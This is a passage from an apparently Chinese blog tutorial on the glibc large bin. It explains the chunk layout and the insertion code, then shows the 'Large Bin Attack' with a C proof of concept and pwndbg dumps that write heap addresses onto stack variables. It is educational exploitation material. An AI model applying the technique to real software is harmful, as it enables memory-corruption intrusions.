<h2 id="Large-bin"><a href="#Large-bin" class="headerlink" title="Large bin"></a>Large bin</h2><p>大于512（1024）字节的 chunk 称之为 large chunk，large bin 就是用于管理这些 large chunk 的</p>
<p>largebin 采用双链表结构，里面的 chunk 从头结点的 fd 指针开始，按大小顺序进行排列 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这个结构中的 <strong>fd_nextsize</strong> 和 <strong>bk_nextsize</strong> 来链接到下一个 size 的堆块头部和上一个 size 的堆块头部，然后在相同 size 的堆块内部再通过 <strong>fd</strong> 和 <strong>bk</strong> 来进行内部的管理</p>
<ul>
<li>用 <strong>fd_nextsize</strong> 和 <strong>bk_nextsize</strong> 链接的链表为横向链表，用 <strong>fd</strong> 和 <strong>bk</strong> 链接的链表为纵向链表</li>
</ul>
<p>在横向链表中，堆管理器维护一个循环的单调链表，由最大的 size（在这个 index 下的最大 size）作为表头，最小的 size 作为表尾，且首尾相连</p>
<p>largebin 基础知识：</p>
<ul>
<li>largebin 中一共包括 63 个 bin，index为64~126，每个 bin 中的 chunk 的大小不一致，而是处于一定区间范围内</li>
<li>largebin 的结构和其他链表都不相同，更加复杂</li>
<li>largebin 里除了有 fd，bk 指针，另外还有 fd_nextsize 和 bk_nextsize 这两个指针</li>
<li>largebin 的插入顺序不再是LIFO或FIFO，而是一种全新的方式</li>
</ul>
<p>largebin 特性：</p>
<ul>
<li>按照大小从大到小排序，若大小相同,按照 free 时间排序</li>
<li>若干个大小相同的堆块，只有首堆块的 <code>fd_nextsize</code> 和 <code>bk_nextsize</code> 会指向其他堆块,后面的堆块的 <code>fd_nextsize</code> 和 <code>bk_nextsize</code> 均为 “0”</li>
<li>size 最大的chunk的 <code>bk_nextsize</code> 指向最小的 chunk，size 最小的 chunk 的 <code>fd_nextsize</code> 指向最大的 chunk</li>
</ul>
<p>下面的代码将解释 largebin 的插入顺序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range(size)) <span class="comment">/* smallbin(暂时不管) */</span></span><br><span class="line">&#123;</span><br><span class="line">  victim_index = smallbin_index(size);<span class="comment">//获取size对应的smallbin的index</span></span><br><span class="line">  bck = bin_at(av, victim_index);<span class="comment">//bck指向size对应的smallbin的链表头</span></span><br><span class="line">  <span class="comment">//fwd指向size对应的smallbin的链表中的新加入的chunk(small bin使用头插法)</span></span><br><span class="line">  fwd = bck-&gt;fd;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="comment">/* largebin(核心) */</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    victim =&gt; 需要插入的目标chunk</span></span><br><span class="line"><span class="comment">    fwd =&gt; 最终为victim的上一个chunk(可以定位victim)</span></span><br><span class="line"><span class="comment">    bck =&gt; 最终为victim的下一个chunk(可以定位victim)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    </span><br><span class="line">  victim_index = largebin_index(size); <span class="comment">/* 获取size对应的largebin的index */</span></span><br><span class="line">  bck = bin_at(av, victim_index); </span><br><span class="line">  fwd = bck-&gt;fd; </span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    fwd =&gt; 最大的chunk(对应链表头中的第一个chunk)</span></span><br><span class="line"><span class="comment">    bck =&gt; 对应的largebin的链表头</span></span><br><span class="line"><span class="comment">    bck-&gt;fd =&gt; 对应largebin中最大的chunk(并且是第一个chunk)</span></span><br><span class="line"><span class="comment">    bck-&gt;bk =&gt; 对应largebin中最小的chunk(并且是最后一个chunk)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    </span><br><span class="line">  <span class="comment">//如果largebin非空，在largbin进行按顺序插入</span></span><br><span class="line">  <span class="keyword">if</span> (fwd != bck) &#123;</span><br><span class="line">      <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">      size |= PREV_INUSE;</span><br><span class="line">      assert((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);<span class="comment">//默认不启用assert</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size)) &#123;</span><br><span class="line">          <span class="comment">/* </span></span><br><span class="line"><span class="comment">          &quot;bck-&gt;bk&quot;指向对应largebin中最小的chunk</span></span><br><span class="line"><span class="comment">           如果&quot;size&quot;&lt;&quot;bck-&gt;bk-&gt;size&quot;，那么目标chunk将成为新的最小chunk</span></span><br><span class="line"><span class="comment">           因此需要把victim添加到此largebin的尾部</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line">          </span><br><span class="line">          fwd = bck; <span class="comment">/* fwd = 原链表头 */</span></span><br><span class="line">          bck = bck-&gt;bk; <span class="comment">/* bck = 原链表尾(最后一个chunk) */</span>    </span><br><span class="line">        </span><br><span class="line">          victim-&gt;fd_nextsize = fwd-&gt;fd; </span><br><span class="line">          <span class="comment">/* 在&quot;victim-&gt;fd_nextsize&quot;中装入&quot;最大chunk&quot; */</span></span><br><span class="line">          victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; </span><br><span class="line">          <span class="comment">/* 在&quot;victim-&gt;bk_nextsize&quot;中装入&quot;原最小chunk&quot; */</span></span><br><span class="line">          fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">          <span class="comment">/* 先把 &quot;victim&quot; 装入 &quot;原最小chunk-&gt;fd_nextsize&quot; */</span></span><br><span class="line">          <span class="comment">/* 再把 &quot;victim&quot; 装入 &quot;最大chunk-&gt;bk_nextsize&quot; */</span></span><br><span class="line">      &#125; </span><br><span class="line">      <span class="keyword">else</span> <span class="comment">/* 如果victim不是(不唯一是)largebin中最小的chunk */</span></span><br><span class="line">      &#123;</span><br><span class="line">          assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);<span class="comment">//默认不启用assert</span></span><br><span class="line">          <span class="comment">//从大到小（从头到尾）找到合适的位置</span></span><br><span class="line">          <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size) &#123;</span><br><span class="line">              fwd = fwd-&gt;fd_nextsize; <span class="comment">/* 不断更新fwd,直到&quot;size&quot;&gt;=&quot;fwd-&gt;size&quot; */</span></span><br><span class="line">              assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">          &#125;</span><br><span class="line">            </span><br><span class="line">          <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">              <span class="comment">/* 如果size刚好相等，就直接插入对应纵向列表的头部 */</span></span><br><span class="line">              fwd = fwd-&gt;fd; <span class="comment">/* fwd = 对应纵向列表的第一个chunk(跳过了头部) */</span></span><br><span class="line">          <span class="keyword">else</span> </span><br><span class="line">          &#123;</span><br><span class="line">              <span class="comment">/* 如果size不相等(&quot;size&quot;&gt;&quot;fwd-&gt;size&quot;)，就把victim加入到新的纵向链表 */</span></span><br><span class="line">              <span class="comment">/* fwd = 新纵向列表的头部 */</span></span><br><span class="line">              </span><br><span class="line">              victim-&gt;fd_nextsize = fwd;</span><br><span class="line">              <span class="comment">/* 在&quot;victim-&gt;fd_nextsize&quot;中装入&quot;对应size小于victim的纵向链表&quot; */</span></span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">              <span class="comment">/* 在&quot;victim-&gt;bk_nextsize&quot;中装入&quot;对应size大于victim的纵向链表&quot; */</span></span><br><span class="line">              fwd-&gt;bk_nextsize = victim;</span><br><span class="line">              <span class="comment">/* 在&quot;纵向链表(小于victim)-&gt;bk_nextsize&quot;中装入&quot;victim&quot; */</span></span><br><span class="line">              victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">              <span class="comment">/* 在&quot;纵向链表(大于victim)-&gt;fd_nextsize&quot;中装入&quot;victim&quot; */</span></span><br><span class="line">          &#125;</span><br><span class="line">          bck = fwd-&gt;bk; <span class="comment">/* bck = 当前fwd的上一个chunk*/</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">else</span> <span class="comment">//如果largebin为空，将victim加入到纵向列表</span></span><br><span class="line">    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">    <span class="comment">/* 先把 &quot;victim&quot; 装入 &quot;victim-&gt;bk_nextsize&quot; */</span></span><br><span class="line">    <span class="comment">/* 再把 &quot;victim&quot; 装入 &quot;victim-&gt;fd_nextsize&quot; */</span></span><br><span class="line">&#125;</span><br><span class="line">mark_bin(av, victim_index); <span class="comment">//把victim加入到的bin的表示为非空</span></span><br><span class="line"><span class="comment">//把victim加入到large bin的链表中</span></span><br><span class="line">victim-&gt;bk = bck; <span class="comment">/* bck = victim对应的下一个chunk */</span></span><br><span class="line">victim-&gt;fd = fwd; <span class="comment">/* fwd = victim对应的上一个chunk */</span></span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>
<p>发现以下规律：</p>
<ul>
<li>在纵向列表外部：对应的largebin从大到小组织各个纵向列表</li>
<li>在纵向列表内部：新加入的chunk直接插头，而位于表头的chunk固定不变（除非其余成员全部被申请）</li>
</ul>
<h2 id="Large-Bin-Attack"><a href="#Large-Bin-Attack" class="headerlink" title="Large Bin Attack"></a>Large Bin Attack</h2><p>LargeBin Attack 就发生在堆块中 UnsortedBin 放入 LargeBin 的过程当中去</p>
<ul>
<li>写入第一个地址：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure>
<p>如果我们对 victim-&gt;bk_nextsize 进行伪造，那么就可以控制程序写一个堆块地址到目标位置</p>
<ul>
<li>写入第二个地址：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bck-&gt;fd = victim; <span class="comment">/* bck 也就是 fwd-&gt;bk */</span></span><br></pre></td></tr></table></figure>
<p>如果我们可以控制 fwd-&gt;bk 位置，那么就可以写一个堆块地址到目标位置</p>
<p>下面就是利用案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>); <span class="comment">/* 防止合并 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line"></span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var1 - <span class="number">2</span>); <span class="comment">/* long 在64位机器上时8字节 */</span></span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="keyword">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="keyword">void</span> *)stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 ./test </span><br><span class="line">stack_var1 (<span class="number">0x7fffc5efda80</span>): <span class="number">0</span></span><br><span class="line">stack_var2 (<span class="number">0x7fffc5efda88</span>): <span class="number">0</span></span><br><span class="line"></span><br><span class="line">stack_var1 (<span class="number">0x7fffc5efda80</span>): <span class="number">0x55ea64ab09a0</span></span><br><span class="line">stack_var2 (<span class="number">0x7fffc5efda88</span>): <span class="number">0x55ea64ab09a0</span></span><br></pre></td></tr></table></figure>
<p>可以发现：两个栈地址上被写入了数据，接下来就看看具体的执行过程</p>
<p>“p1”和“p2”刚刚释放时：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x55555555a360</span> —▸ <span class="number">0x55555555a000</span> —▸ <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x55555555a360</span></span><br><span class="line">    <span class="comment">/* p2 -&gt; p1 -&gt; main_arena */</span></span><br></pre></td></tr></table></figure>
<p>不出意料的都放入了 unsortedbin ，接下来再进行申请时，ptmalloc就会根据“size”把目标chunk放入对应的bins中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x55555555a0a0</span> —▸ <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x55555555a0a0</span></span><br><span class="line">    <span class="comment">/* p1(分割后) -&gt; main_arena */</span></span><br><span class="line">largebins</span><br><span class="line"><span class="number">0x500</span>: <span class="number">0x55555555a360</span> —▸ <span class="number">0x7ffff7dd1fa8</span> (main_arena+<span class="number">1160</span>) ◂— <span class="number">0x55555555a360</span></span><br><span class="line">    <span class="comment">/* 遍历到p1时就满足了分割的条件(从后往前),所以p1被分割,p2则放入了largebins */</span></span><br></pre></td></tr></table></figure>
<p>接下来释放p3，然后修改p2：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x55555555a8a0</span> —▸ <span class="number">0x55555555a0a0</span> —▸ <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x55555555a8a0</span></span><br><span class="line">    <span class="comment">/* p3 -&gt; p1(分割后) -&gt; main_arena */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>修改前：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x55555555a360</span></span><br><span class="line"><span class="number">0x55555555a360</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000511</span></span><br><span class="line"><span class="number">0x55555555a370</span>:	<span class="number">0x00007ffff7dd1fa8</span>	<span class="number">0x00007ffff7dd1fa8</span></span><br><span class="line"><span class="number">0x55555555a380</span>:	<span class="number">0x000055555555a360</span>	<span class="number">0x000055555555a360</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0x7fffffffdf10</span> ◂— <span class="number">0x0</span> <span class="comment">// stack_var1</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7fffffffdf18</span> ◂— <span class="number">0x0</span> <span class="comment">// stack_var2</span></span><br></pre></td></tr></table></figure>
<ul>
<li>修改后：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x55555555a360</span></span><br><span class="line"><span class="number">0x55555555a360</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000003f1</span></span><br><span class="line"><span class="number">0x55555555a370</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00007fffffffdf00</span> <span class="comment">// stack_var1 - 2</span></span><br><span class="line"><span class="number">0x55555555a380</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00007fffffffdef8</span> <span class="comment">// stack_var2 - 4</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0x7fffffffdf10</span> —▸ <span class="number">0x55555555a8a0</span> ◂— <span class="number">0x0</span> <span class="comment">// stack_var1</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7fffffffdf18</span> —▸ <span class="number">0x55555555a8a0</span> ◂— <span class="number">0x0</span> <span class="comment">// stack_var2</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stack_var1 (<span class="number">0x7fffffffdf10</span>): <span class="number">0x55555555a8a0</span></span><br><span class="line">stack_var2 (<span class="number">0x7fffffffdf18</span>): <span class="number">0x55555555a8a0</span></span><br></pre></td></tr></table></figure>
<p>成功在“stack_var1”和“stack_var2”中写入了“p3”的地址，这就是利用了以下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">bck-&gt;fd = victim; <span class="comment">/* bck 也就是 fwd-&gt;bk */</span></span><br></pre></td></tr></table></figure>
<p>在“p2”覆盖完毕后，再次申请内存空间的过程中：</p>
<ul>
<li>p3会被写入largebin，它的结构如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x55555555b8a0</span></span><br><span class="line"><span class="number">0x55555555b8a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000511</span></span><br><span class="line"><span class="number">0x55555555b8b0</span>:	<span class="number">0x000055555555b360</span>	<span class="number">0x00007fffffffdf00</span> </span><br><span class="line">	<span class="comment">/* FD = p2			BK = stack_var1-2 */</span></span><br><span class="line"><span class="number">0x55555555b8c0</span>:	<span class="number">0x000055555555b360</span>	<span class="number">0x00007fffffffdef8</span></span><br><span class="line">	<span class="comment">/* fd_nextsize = p2			bk_nextsize = stack_var2-4 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>在前面操作中，p2的size被修改，使得p3成为新的纵向列表头</li>
<li>因为 “p3-&gt;size” 大于 “p2-&gt;size”，所以p3将插入p2前面</li>
<li>下面的代码都是将解释p3进入largebin后的结构：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fwd = bck <span class="comment">/* fwd初始化为原链表头 */</span></span><br><span class="line">fwd = fwd-&gt;fd_nextsize <span class="comment">/* 遍历链表寻找合适的fwd,最后找到fwd=p2(p2已经被伪造) */</span></span><br><span class="line"><span class="comment">/* fwd = p2 */</span></span><br><span class="line"></span><br><span class="line">bck = fwd-&gt;bk <span class="comment">/* 这里的fwd就是p2,而fwd-&gt;bk则是&quot;stack_var1-2&quot; */</span></span><br><span class="line"><span class="comment">/* bck = stack_var1-2 */</span></span><br><span class="line">    </span><br><span class="line">victim-&gt;bk = bck <span class="comment">/* bk = stack_var1 - 2 */</span></span><br><span class="line">victim-&gt;fd = fwd <span class="comment">/* fd = p2 */</span></span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize <span class="comment">/* bk_nextsize = stack_var2 - 4 */</span></span><br><span class="line">victim-&gt;fd_nextsize = fwd <span class="comment">/* fd_nextsize = p2 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>最后解释一下“stack_var1”和“stack_var2”被修改的原因：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* fwd = p2 */</span></span><br><span class="line"><span class="comment">/* bck = stack_var1-2 */</span></span><br><span class="line"></span><br><span class="line">fwd-&gt;bk_nextsize = victim <span class="comment">/* p2-&gt;bk_nextsize=victim */</span></span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim <span class="comment">/* (stack_var2-4)-&gt;fd_nextsize=victim */</span></span><br><span class="line">fwd-&gt;bk = victim <span class="comment">/* p2-&gt;bk=victim */</span></span><br><span class="line">bck-&gt;fd = victim <span class="comment">/* (stack_var1-2)-&gt;fd=victim */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7fffffffdef8</span> ◂— <span class="number">0x0</span> <span class="comment">// stack_var2-4</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│ r8  <span class="number">0x7fffffffdf00</span> —▸ <span class="number">0x7fffffffdf40</span> —▸ <span class="number">0x555555555330</span> (__libc_csu_init) ◂— endbr64 <span class="comment">// stack_var1-2</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x7fffffffdf08</span> —▸ <span class="number">0x5555555552c6</span> (main+<span class="number">316</span>) ◂— mov    rax, qword ptr [rbp - <span class="number">0x30</span>]</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│ rsp <span class="number">0x7fffffffdf10</span> —▸ <span class="number">0x55555555b8a0</span> ◂— <span class="number">0x0</span> <span class="comment">// stack_var1</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x7fffffffdf18</span> —▸ <span class="number">0x55555555b8a0</span> 